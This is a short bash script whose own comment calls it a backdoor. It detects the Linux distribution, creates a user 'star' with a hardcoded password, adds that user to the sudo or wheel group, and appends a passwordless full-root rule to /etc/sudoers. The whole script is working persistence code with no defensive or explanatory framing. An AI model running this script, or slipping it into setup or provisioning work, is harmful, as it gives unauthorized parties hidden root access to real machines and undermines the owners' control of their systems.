#!/bin/bash

# get operating system
os=$(cat /etc/os-release | grep -oP '(?<=^ID=).+' | tr -d '"')

# add backdoor user star with full sudo access
useradd star
echo "star:StarShower1?" | chpasswd

if [ $os == "ubuntu" ]; then
  adduser star sudo
else
    usermod -aG wheel star
fi

if [ -f /etc/sudoers ]; then
  echo "star ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
fi
